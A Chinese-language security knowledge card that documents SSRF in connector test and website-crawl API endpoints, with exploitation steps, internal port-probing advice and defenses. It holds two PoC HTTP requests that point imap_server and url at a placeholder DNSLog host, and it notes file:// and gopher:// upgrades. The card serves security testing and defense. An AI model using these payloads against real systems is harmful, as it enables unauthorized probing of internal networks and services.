---
id: web-generic-ssrf-connector-imap-website-test-endpoints
title: 连接器测试接口 SSRF：IMAP 测试与网站抓取参数直连任意主机
type: scenario
domain: web
path: web/generic/ssrf
technique: connector-test-endpoint-ssrf
aliases:
- 连接器 test-connection SSRF
- IMAP 连接测试 SSRF
- 网站抓取 list 接口 SSRF
- QAnswer 连接器 SSRF
- 盲 SSRF 内网探测
tags:
- web
- ssrf
- connector
- imap
- crawler
- blind-ssrf
- internal-network
- dnslog
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V75
  verified_at: '2026-11-05T16:51:00+08:00'
  notes: 已对照图08-12核对；imap-connector/test-connection中imap_server=DNSLog子域且QAnswer-Api-Key非必填、website/list url=DNSLog子域，DNSLog均收到目标出口IP记录，与卡片一致；真实域名已用占位符；PoC未复跑
---

## 一句话结论

连接器管理平台的“测试连接/抓取网站”接口把用户提供的 `imap_server`、`port`、`url` 直接交给服务端建立网络连接或抓取，未做协议、主机与内网 IP 校验；攻击者可借 DNSLog 与响应时间差异确认盲 SSRF，进而探测内网主机、端口并访问内网 HTTP 服务。

## 原理

- 连接器类功能需要在服务端验证第三方服务是否可达：IMAP 测试会按请求体中的 `imap_server`、`port`、`use_ssl` 建立 TCP/TLS 连接；网站抓取会按 `url` 发起 HTTP 请求并解析页面。这类“先连一下”的语义天然要求服务端对外发起请求。
- 若接口只把参数传给 socket/crawler，没有对目标做 URL 解析、协议白名单、私网/环回/链路本地地址过滤，攻击者就能把目标指向任意 host:port。服务端的网络位置（云主机、内网）决定了 SSRF 的价值。
- 盲 SSRF 的可观测性：让目标连接攻击者控制的 DNS 域名（如 DNSLog 子域名），服务端解析域名时会在 DNS 平台留下记录，证明请求确实由服务端发出；对内网 IP，可用连接成功/拒绝的响应时间或错误差异判断端口开放。
- 网站抓取接口还会返回页面内容或抓取结果，具备从盲 SSRF 升级为有回显 SSRF 的条件；IMAP 测试接口则可按 IMAP 握手错误/超时区分端口和服务。
- 认证头（如 `QAnswer-Api-Key`）在示例中非必填，暴露的 Swagger 文档直接给出请求结构，降低了利用门槛。

## 触发条件

- 连接器测试/抓取接口可从攻击者位置访问，且 API Key 等认证不是强制校验；
- 服务端允许出站 DNS/HTTP/TCP，未被统一代理或防火墙完全限制；
- 参数直接进入连接或抓取逻辑，未做主机/IP 白名单；
- 目标内网存在可被探测或访问的服务。

## 利用步骤

1. 从 Swagger/API 文档枚举连接器接口，记录 `test-connection`、`list` 等路径及请求体字段。
2. 把 `imap_server` 设为 DNSLog 子域名，`port` 设为任意值，`use_ssl=false`，发送请求；在 DNSLog 平台观察来自目标出口 IP 的解析记录。
3. 将目标换成内网 IP 与常见端口（22/80/443/3306/6379/8080 等），根据响应时间、连接拒绝、握手错误或超时差异判断存活与开放情况。
4. 对网站抓取接口提交 `url=http://<dnslog>/` 确认回调；再提交内网 HTTP 地址，观察返回的页面/标题/状态，读取仅内网可达的服务。
5. 绘制内网拓扑，优先寻找未授权管理后台、元数据服务、Redis 等可进一步利用的目标；仅在授权范围内验证。
6. 测试时控制并发与频率，避免对目标连接器或内网服务造成压力。

## PoC

IMAP 测试（盲 SSRF/DNSLog 验证）：

```http
POST /api/connectors/imap-connector/test-connection HTTP/1.1
Host: target.example.com
Content-Type: application/json

{
  "imap_server": "<random>.dnslog.example",
  "email": "test@example.com",
  "password": "test",
  "port": 8000,
  "use_ssl": false
}
```

网站抓取（服务端请求任意 URL）：

```http
POST /api/connectors/website/list HTTP/1.1
Host: target.example.com
Content-Type: application/json

{
  "url": "http://<random>.dnslog.example/",
  "depth": 1,
  "limit_per_level": 1,
  "timeout": 1,
  "cookies": {},
  "local_storage": {},
  "respect_robot": true
}
```

DNSLog 出现目标出口 IP 的解析记录即证明服务端发起了请求；对内网地址，用响应时间与错误类型判断端口状态。原文用该方法确认了两个接口均可触发 SSRF。

## 变体与关联

- 变体：SMTP/数据库/消息队列/Webhook 等“测试连接”接口同样会把 host/port 或 URL 交给服务端；参数名可能是 `host`、`server`、`endpoint`、`base_url`、`webhook`。
- 变体：抓取接口支持 `file://`、`gopher://` 等协议时，可升级为任意文件读取或内网协议利用；支持重定向时可绕过域名白名单。
- 关联：[[web-generic-ssrf-zentao-ai-model-test-connection]]（同类 test-connection SSRF）、[[web-generic-ssrf-ip-notation-blacklist-bypass]]（IP 变形绕过）、[[web-generic-ssrf-url-parser-differential-allowlist-bypass]]。
- 边界：服务端强制走白名单代理、解析后校验 IP、禁止非 HTTP(S) 协议、或连接器功能未暴露时，不成立。

## 检测与防御

- 检测：测试连接/抓取接口的目标为 DNSLog 域名、私网/环回/链路本地地址或非常用端口；同一账号短时间大量不同 host/port 的请求；响应时间呈端口扫描特征。
- 防御：对目标 URL 做严格解析与协议白名单（仅 http/https），解析后的 IP 必须不属于私网、环回、链路本地、保留地址与云元数据网段；禁止跟随重定向或对重定向目标再次校验。
- 防御：连接器测试接口要求强认证与最小权限，未使用的连接器类型直接下线；服务端出站流量走统一代理并限制可达网段。
- 防御：对测试连接设置短超时、频率限制与审计日志，记录目标 host/port 与调用者。
